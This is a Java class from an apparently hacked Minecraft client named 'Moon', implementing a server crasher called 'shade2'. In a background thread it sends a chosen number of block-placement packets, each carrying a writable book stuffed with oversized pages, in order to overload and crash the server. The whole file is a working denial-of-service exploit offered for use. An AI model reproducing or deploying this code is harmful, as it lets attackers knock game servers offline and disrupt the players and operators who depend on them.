package Moon.methods.impl;

import Moon.helpers.ChatHelper;
import Moon.methods.Crash;
import Moon.methods.CrashInfo;
import Moon.mods.notifications.Notification;
import Moon.mods.notifications.NotificationManager;
import Moon.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;

@CrashInfo(
        name = "shade2"
)
public class CrashShade2 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Moon"), "Shade crasher started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));
        (new Thread(() -> {
            for (int i = 0; i < packets; ++i) {
                ItemStack book = new ItemStack(Items.writable_book);
                String size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
                NBTTagCompound tag = new NBTTagCompound();
                NBTTagList list = new NBTTagList();
                for (int i3 = 0; i3 < 20; ++i3) {
                    NBTTagString tString = new NBTTagString(size);
                    list.appendTag(tString);
                }
                tag.setString("author", Minecraft.getMinecraft().getSession().getUsername());
                tag.setString("title", "Moon");
                tag.setByte("resolved", (byte) 1);
                tag.setTag("pages", list);
                if (book.hasTagCompound()) {
                    NBTTagCompound tagb = book.getTagCompound();
                    tagb.setTag("pages", list);
                } else {
                    book.setTagInfo("pages", list);
                }
                book.setTagCompound(tag);
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 0.0D, Minecraft.getMinecraft().thePlayer.posZ), 2, book, 0.0F, 0.0F, 0.0F));
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
